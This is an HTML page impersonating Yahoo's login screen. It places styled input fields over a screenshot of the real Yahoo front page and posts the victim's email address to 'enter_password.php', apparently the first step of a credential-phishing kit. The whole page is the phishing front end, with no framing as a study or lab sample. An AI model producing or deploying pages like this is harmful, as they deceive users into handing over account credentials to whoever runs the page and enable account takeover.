<!DOCTYPE html>
<html>
<head>
	<link rel="shortcut icon" href="media/favicon.ico" />
	<title>Yahoo - Login</title>
	<style>
		body  {
			background-image: url("media/yahoo_front.png");
		}


		.login {
		position:absolute;
		left: 860px;
		top: 215px;
		width: 287px;
		height: 30px;
		border: 0;
		font-size: 16px;
		font-style: bold;
		padding-bottom: 15px;
		padding: 7px;
		margin: 5px 0;
		border-bottom: 2px solid #4289f4;
		box-shadow: none;
		}

		.button {
		position:absolute;
		left: 860px;
		top: 285px;
		border: blue; 
		background-color: #4289f4;
		font-style: bold;
		font-size: 16px;
		color: white;
		cursor: pointer;
		width: 300px;
		height: 40px;
		}

		.button:hover {
			color: #effdff;
			box-shadow: 1px 1px 1px #a9cff2;
		}


	</style>
</head>
<body>

	<form id="FormDated" name="FormDated" method="post" action="enter_password.php">

		<input class="login" name="userid" type="text" id="userid" size="45" placeholder="Enter your email" maxlength="50" required>
		</input>

		<input class="button" type="submit" value="Next"/>


	</form>

</body>
</html>